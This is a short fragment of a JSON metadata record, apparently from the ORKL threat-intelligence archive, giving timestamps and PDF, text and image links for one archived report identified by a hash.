    "ts_updated_at": 1743041847,
    "ts_creation_date": 1653698064,
    "ts_modification_date": 1653698064,
    "files": {
        "pdf": "https://archive.orkl.eu/6dd1706e73e98b83c6cfbef2414de2e5e4e2ad76.pdf",
        "text": "https://archive.orkl.eu/6dd1706e73e98b83c6cfbef2414de2e5e4e2ad76.txt",
        "img": "https://archive.orkl.eu/6dd1706e73e98b83c6cfbef2414de2e5e4e2ad76.jpg"
    }
}